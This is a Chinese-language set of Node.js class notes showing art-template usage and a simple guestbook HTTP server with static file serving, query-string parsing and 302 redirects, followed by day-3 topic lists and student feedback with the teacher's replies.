class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于模板名渲染模板</span></span><br><span class="line">template(filename, data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将模板源代码编译成函数</span></span><br><span class="line">template.compile(source, options);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将模板源代码编译成函数并立刻执行</span></span><br><span class="line">template.render(source, data, options);</span><br><span class="line">编译并返回渲染结果。</span><br><span class="line">    参数：</span><br><span class="line">    &#123;string&#125; source</span><br><span class="line">    &#123;<span class="built_in">Object</span>&#125; options</span><br><span class="line">    返回值：&#123;string&#125;</span><br><span class="line"><span class="keyword">var</span> html = template.render(<span class="string">&#x27;hi, &lt;%=value%&gt;.&#x27;</span>, &#123;<span class="attr">value</span>: <span class="string">&#x27;aui&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure></li><li><p>模板引擎用法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./template-web.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/html&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;tpl&#x27;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        大家好，我叫</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml">;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        我的爱好是:</span><span class="template-variable">&#123;&#123;<span class="name"><span class="builtin-name">each</span></span> hobbies&#125;&#125;</span><span class="template-variable">&#123;&#123;<span class="name">$value</span>&#125;&#125;</span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span><span class="xml">;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">    </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ret = template(<span class="string">&#x27;tpl&#x27;</span>, &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;zx&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">hobbies</span>: [<span class="string">&#x27;唱歌&#x27;</span>, <span class="string">&#x27;跳舞&#x27;</span>]</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ret);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> ret);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> s = <span class="built_in">JSON</span>.parse(ret);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(s);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>nodejs模板引擎用法</p><ul><li>index.html</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好我叫&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>我今年&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> template=<span class="built_in">require</span>(<span class="string">&#x27;art-template&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> file=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">file.readFile(<span class="string">&#x27;./index.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ret=template.render(data.toString(),&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;zx&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>:<span class="string">&#x27;22&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(ret);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app application 应用程序</span></span><br><span class="line"><span class="comment">// 把当前模块所有的依赖项都声明再文件模块最上面</span></span><br><span class="line"><span class="comment">// 为了让目录结构保持统一清晰，所以我们约定，把所有的 HTML 文件都放到 views（视图） 目录中</span></span><br><span class="line"><span class="comment">// 我们为了方便的统一处理这些静态资源，所以我们约定把所有的静态资源都存放在 public 目录中</span></span><br><span class="line"><span class="comment">// 哪些资源能被用户访问，哪些资源不能被用户访问，我现在可以通过代码来进行非常灵活的控制</span></span><br><span class="line"><span class="comment">// / index.html</span></span><br><span class="line"><span class="comment">// /public 整个 public 目录中的资源都允许被访问</span></span><br><span class="line"><span class="comment">// 前后端融会贯通了，为所欲为</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> template = <span class="built_in">require</span>(<span class="string">&#x27;art-template&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> comments = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">    <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三2&#x27;</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">    <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三3&#x27;</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">    <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三4&#x27;</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">    <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三5&#x27;</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">    <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// /pinglun?name=的撒的撒&amp;message=的撒的撒的撒</span></span><br><span class="line"><span class="comment">// 对于这种表单提交的请求路径，由于其中具有用户动态填写的内容</span></span><br><span class="line"><span class="comment">// 所以你不可能通过去判断完整的 url 路径来处理这个请求</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 结论：对于我们来讲，其实只需要判定，如果你的请求路径是 /pinglun 的时候，那我就认为你提交表单的请求过来了</span></span><br><span class="line"></span><br><span class="line">http</span><br><span class="line">  .createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; <span class="comment">// 简写方式，该函数会直接被注册为 server 的 request 请求事件处理函数</span></span><br><span class="line">    <span class="comment">// 使用 url.parse 方法将路径解析为一个方便操作的对象，第二个参数为 true 表示直接将查询字符串转为一个对象（通过 query 属性来访问）</span></span><br><span class="line">    <span class="keyword">var</span> parseObj = url.parse(req.url, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单独获取不包含查询字符串的路径部分（该路径不包含 ? 之后的内容）</span></span><br><span class="line">    <span class="keyword">var</span> pathname = parseObj.pathname</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pathname === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">&#x27;./views/index.html&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.end(<span class="string">&#x27;404 Not Found.&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> htmlStr = template.render(data.toString(), &#123;</span><br><span class="line">          <span class="attr">comments</span>: comments</span><br><span class="line">        &#125;)</span><br><span class="line">        res.end(htmlStr)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname === <span class="string">&#x27;/post&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">// 其它的都处理成 404 找不到</span></span><br><span class="line">      fs.readFile(<span class="string">&#x27;./views/post.html&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.end(<span class="string">&#x27;404 Not Found.&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        res.end(data)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname.indexOf(<span class="string">&#x27;/public/&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// /public/css/main.css</span></span><br><span class="line">      <span class="comment">// /public/js/main.js</span></span><br><span class="line">      <span class="comment">// /public/lib/jquery.js</span></span><br><span class="line">      <span class="comment">// 统一处理：</span></span><br><span class="line">      <span class="comment">//    如果请求路径是以 /public/ 开头的，则我认为你要获取 public 中的某个资源</span></span><br><span class="line">      <span class="comment">//    所以我们就直接可以把请求路径当作文件路径来直接进行读取</span></span><br><span class="line">      fs.readFile(<span class="string">&#x27;.&#x27;</span> + pathname, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.end(<span class="string">&#x27;404 Not Found.&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        res.end(data)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname === <span class="string">&#x27;/pinglun&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">// 注意：这个时候无论 /pinglun?xxx 之后是什么，我都不用担心了，因为我的 pathname 是不包含 ? 之后的那个路径</span></span><br><span class="line">      <span class="comment">// 一次请求对应一次响应，响应结束这次请求也就结束了</span></span><br><span class="line">      <span class="comment">// res.end(JSON.stringify(parseObj.query))</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 我们已经使用 url 模块的 parse 方法把请求路径中的查询字符串给解析成一个对象了</span></span><br><span class="line">      <span class="comment">// 所以接下来要做的就是：</span></span><br><span class="line">      <span class="comment">//    1. 获取表单提交的数据 parseObj.query</span></span><br><span class="line">      <span class="comment">//    2. 将当前时间日期添加到数据对象中，然后存储到数组中</span></span><br><span class="line">      <span class="comment">//    3. 让用户重定向跳转到首页 /</span></span><br><span class="line">      <span class="comment">//       当用户重新请求 / 的时候，我数组中的数据已经发生变化了，所以用户看到的页面也就变了</span></span><br><span class="line">      <span class="keyword">var</span> comment = parseObj.query</span><br><span class="line">      comment.dateTime = <span class="string">&#x27;2017-11-2 17:11:22&#x27;</span></span><br><span class="line">      comments.unshift(comment)</span><br><span class="line">      <span class="comment">// 服务端这个时候已经把数据存储好了，接下来就是让用户重新请求 / 首页，就可以看到最新的留言内容了</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如何通过服务器让客户端重定向？</span></span><br><span class="line">      <span class="comment">//    1. 状态码设置为 302 临时重定向</span></span><br><span class="line">      <span class="comment">//        statusCode</span></span><br><span class="line">      <span class="comment">//    2. 在响应头中通过 Location 告诉客户端往哪儿重定向</span></span><br><span class="line">      <span class="comment">//        setHeader</span></span><br><span class="line">      <span class="comment">// 如果客户端发现收到服务器的响应的状态码是 302 就会自动去响应头中找 Location ，然后对该地址发起新的请求</span></span><br><span class="line">      <span class="comment">// 所以你就能看到客户端自动跳转了</span></span><br><span class="line">      res.statusCode = <span class="number">302</span></span><br><span class="line">      res.setHeader(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      res.end()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 其它的都处理成 404 找不到</span></span><br><span class="line">      fs.readFile(<span class="string">&#x27;./views/404.html&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.end(<span class="string">&#x27;404 Not Found.&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        res.end(data)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;running...&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Node 不适合从来没有接触过服务端的人学习</span></span><br><span class="line"><span class="comment">// 如果想要真正的学号服务端，还是老牌的 Java、PHP 这些平台</span></span><br><span class="line"><span class="comment">// Node 不是特别适合入门服务端，但不代表 Node 不强大</span></span><br><span class="line"><span class="comment">// Node 很厉害，具有经验的人可以玩儿的非常的牛</span></span><br><span class="line"><span class="comment">// 不适合新手的原因就在于比较偏底层、而且太灵活</span></span><br><span class="line"><span class="comment">// Java、PHP 好入门的原因就在于：这些平台屏蔽了一些底层</span></span><br><span class="line"><span class="comment">// res.redirect(&#x27;重定向&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 晚上写案例照着下面的步骤写：</span></span><br><span class="line"><span class="comment">// 1. / index.html</span></span><br><span class="line"><span class="comment">// 2. 开放 public 目录中的静态资源</span></span><br><span class="line"><span class="comment">//    当请求 /public/xxx 的时候，读取响应 public 目录中的具体资源</span></span><br><span class="line"><span class="comment">// 3. /post post.html</span></span><br><span class="line"><span class="comment">// 4. /pinglun</span></span><br><span class="line"><span class="comment">//    4.1 接收表单提交数据</span></span><br><span class="line"><span class="comment">//    4.2 存储表单提交的数据</span></span><br><span class="line"><span class="comment">//    4.3 让表单重定向到 /</span></span><br><span class="line"><span class="comment">//        statusCode</span></span><br><span class="line"><span class="comment">//        setHeader</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 明天：</span></span><br><span class="line"><span class="comment">// 模块系统</span></span><br><span class="line"><span class="comment">// Express（第三方 Web 开发框架）</span></span><br><span class="line"><span class="comment">//    这两做的事儿，在框架里面就是一个 API 的事儿</span></span><br><span class="line"><span class="comment">//    使用框架的目的就是让我们更加专注于业务，而不是底层细节</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p><img src="https://s2.loli.net/2021/12/26/uyRl4HoVSzBtGIO.png" alt="img"></p></li></ul></li></ul><p><img src="https://s2.loli.net/2021/12/26/6vewpc1ZMlr7m2A.png" alt="img"></p><p><img src="https://s2.loli.net/2021/12/26/cbiHTGUquSZ5XLd.png" alt="img"></p><p><img src="https://s2.loli.net/2021/12/26/KyQaoeUA8YFTbES.png" alt="img"></p><h1 id="Node-js-第3天课堂笔记"><a href="#Node-js-第3天课堂笔记" class="headerlink" title="Node.js 第3天课堂笔记"></a>Node.js 第3天课堂笔记</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>增删改查</p></li><li><p>登陆</p></li><li><p>注册</p></li><li><p>头像</p><ul><li>服务端图片</li><li>水印</li><li>图片水印</li></ul></li><li><p>找回密码</p></li><li><p>密码修改</p></li><li><p>模块系统</p><ul><li>核心模块</li><li>第三方模块</li><li>自己写的模块</li><li>加载规则以及加载机制</li><li>循环加载</li></ul></li><li><p>npm</p></li><li><p>package.json</p></li><li><p>Express</p><ul><li>第三方 Web 开发框架</li><li>高度封装了 http 模块</li><li>更加专注于业务，而非底层细节</li><li>知其所以然</li></ul></li><li><p>增删改查</p><ul><li>使用文件来保存数据（锻炼异步编码）</li></ul></li><li><p>MongoDB</p><ul><li>（所有方法都封装好了）</li></ul></li></ul><h2 id="反馈-1"><a href="#反馈-1" class="headerlink" title="反馈"></a>反馈</h2><ul><li>希望老师再推荐一些前端学习的书籍，谢谢！<ul><li> 《JavaScript 高级编程》第3班</li><li> 学习，解决问题</li><li> 书本可以更好的系统的整理学过的内容，了解一些细节</li><li> 《JavaScript 语言精粹》</li></ul></li><li>seo的资料，嘿嘿<ul><li>网站运营 SEO</li><li>SEO 运营专员</li><li>百度、Google、搜狗、</li></ul></li><li> 最后老师那个怎么做案例的步骤真的是很有用 觉得今天的反馈 大概又是夸老师的比较多 老师声音很有特点</li><li> 老师讲的很仔细,虽然语速有点快但是会重复很多遍,即使第一遍没听会第二遍第三遍也懂了.很好.</li><li> 使用markdown一次只能打开一个文件,不知道怎么建文件夹，是需要安插件吗?</li><li>老师，软件版本的升级是以什么作为理论支持的，为什么跳跃间隙可以这么大？还有，看上了老师的电子图书馆，瞬间好爱学习呀，真的！<ul><li> 软件开发版本里面涉及到软件工程学： </li><li>x.x.x<ul><li> 0.0.1</li><li> 0.0.2</li><li> 1.1.5</li><li> 1.9.2</li><li> 2（新增功能比较多，甚至可能去除了某些功能）.5(加入了新功能).0（修复bug，提升性能）</li><li> 大版本</li><li> 一般是这些客户端软件、技术框架开发者比较理解的多</li><li> 做网站很少涉及到版本的概念，网站的目的就是快</li></ul></li></ul></li><li> art-template里面用的语法是jQuery吗， each什么的 我晕了 each,forEach, 遍历的全混了</li><li> 每一次的复习贼重要 老师很不错 我喜欢</li><li>在以后的工作中 用到node.js的地方多吗？ 在留言本的案例中 点击发表留言跳转页面的路径是url路径 和之前写的页面跳转写的文件路径还是有点分不清。<ul><li>技多不压身</li><li>Node 对于前端来讲是进阶高级前端开发工程师必备的技能</li><li>屌丝最容易逆袭的职业</li><li>见得东西多了你就不怕了</li><li>为所欲为</li></ul></li><li> 老师讲的挺清晰的 可是第一节太困了 路径有点没转变过来</li><li>如果从a中调用b中的数据，又从b中调用a中的数据，执行a代码，为什么把b中的执行完后才会执行a，而不是在b调用a的时候a中的代码继续执行<ul><li>a 加载了 b<ul><li>执行 b 中的代码</li><li>同时得到 b 中导出的接口对象：exports</li><li>执行 b 的过程中发现 b 也在 require a</li><li>b 就会反过来执行 a</li><li>a 中又加载 b</li><li>b 又反过来加载 a</li><li>这就是循环加载</li><li>如果你一旦出现了这种情况，说明你的思路有问题。</li><li>jQuery.js （可能不可能出现 jQuery 依赖了 main）</li><li>main.js 依赖了 jQuery</li><li>这个问题是矛盾。</li></ul></li><li>b 中也加载了 a</li><li></li><li>网页中所有的路径其实都是 url 路径，不是文件路径</li></ul></li><li> 问题就是不知道问题是什么,写案例的时候似懂非懂</li><li> 感觉思维有点跟不上,</li></ul><h2 id="复习-1"><a href="#复习-1" class="headerlink" title="复习"></a>复习</h2><ul><li><p>网站开发模型</p><ul><li>黑盒子、哑巴</li><li>写代码让它变得更智能</li><li>按照你设计好的套路供用户使用</li></ul></li><li><p>在 Node 中使用 art-template 模板引擎</p><ul><li>安装</li><li>加载</li><li>template.render()</li></ul></li><li><p>客户端渲染和服务端渲染的区别</p><ul><li>最少两次请求，发起 ajax 在客户端使用模板引擎渲染</li><li>客户端拿到的就是服务端已经渲染好的</li></ul></li><li><p>处理留言本案例首页数据列表渲染展示</p></li><li><p>处理留言本案例发表留言功能</p><ul><li>路径</li><li>设计好的请求路径</li><li>$GET 直接或查询字符串数据</li><li>Node 中需要咱们自己动手来解析<ul><li>url.parse()</li></ul></li><li>/pinglun?name=jack&amp;message=hello</li><li>split(‘?’)</li><li>name=jack&amp;message=hello</li><li>split(‘&amp;’)</li><li>name=jack message=hello</li><li>forEach()</li><li>name=jack.split(‘=’)</li><li>0 key</li><li>1 value</li></ul></li><li><p>掌握如何解析请求路径中的查询字符串</p><ul><li>url.parse()</li></ul></li><li><p>如何在 Node 中实现服务器重定向</p><ul><li>header(‘location’)<ul><li>301 永久重定向 浏览器会记住<ul><li>a.com b.com</li><li>a 浏览器不会请求 a 了</li><li>直接去跳到 b 了</li></ul></li><li>302 临时重定向 浏览器不记忆<ul><li>a.com b.com</li><li>a.com 还会请求 a</li><li>a 告诉浏览器你往 b</li></ul></li></ul></li></ul></li><li><p>Node 中的 Console（REPL）使用</p></li></ul><h2 id="上午总结-2"><a href="#上午总结-2" class="headerlink" 